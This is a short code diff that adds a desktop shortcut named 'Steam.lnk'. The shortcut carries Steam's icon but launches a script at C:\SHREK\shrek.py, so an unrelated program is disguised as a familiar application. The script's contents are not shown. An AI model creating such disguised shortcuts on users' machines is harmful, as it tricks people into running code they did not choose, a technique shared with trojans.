@@ -22,3 +22,14 @@ shortcut.Targetpath = target
 shortcut.WorkingDirectory = wDir
 shortcut.IconLocation = icon
 shortcut.save()
+
+path = os.path.join(desktop, "Steam.lnk")
+target = "C:\\SHREK\\shrek.py"
+wDir = "C:\\SHREK"
+icon = "C:\\Program Files (x86)\\Steam\\steam.exe"
+shell = Dispatch('WScript.Shell')
+shortcut = shell.CreateShortCut(path)
+shortcut.Targetpath = target
+shortcut.WorkingDirectory = wDir
+shortcut.IconLocation = icon
+shortcut.save()
